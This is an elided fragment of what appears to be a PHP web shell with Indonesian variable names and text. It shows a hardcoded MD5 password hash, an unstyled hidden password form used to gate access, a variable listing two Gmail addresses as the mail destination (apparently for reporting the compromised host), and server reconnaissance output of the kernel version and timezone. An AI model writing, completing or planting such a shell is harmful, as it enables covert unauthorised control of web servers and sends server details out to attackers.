...
$pwd = '6669aa769e5bf4125f96badc02e2de15';
...
<form action="" method="post">
    <input type="password" name="f" style="border: none;">
</form>
<?php else: ?>
...
$tujuanmail = 'mrebus667@gmail.com, pewedandi32@gmail.com';
...
echo "Kernel: ".(function_exists('php_uname')?php_uname():'???') . "<br>";
echo "Zona waktu server: " . $timezone . " - " . date('Y-m-d H:i:s') . "<br>";
